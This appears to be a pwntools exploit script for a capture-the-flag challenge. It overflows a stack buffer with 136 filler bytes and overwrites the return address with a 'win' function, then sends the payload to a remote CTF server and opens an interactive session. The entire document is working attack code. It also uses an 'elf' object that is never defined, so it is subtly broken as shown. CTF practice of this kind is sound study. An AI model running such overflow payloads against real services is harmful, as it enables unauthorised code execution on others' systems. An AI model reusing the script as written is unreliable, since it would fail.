from pwn import *

offset = 136
target_address = elf.symbols['win']
print(target_address)

payload = b'A'*offset + p64(target_address)

# conn = process('./echo')
conn = remote('challenge.ctf.games',32766)

conn.sendline(payload)

conn.interactive()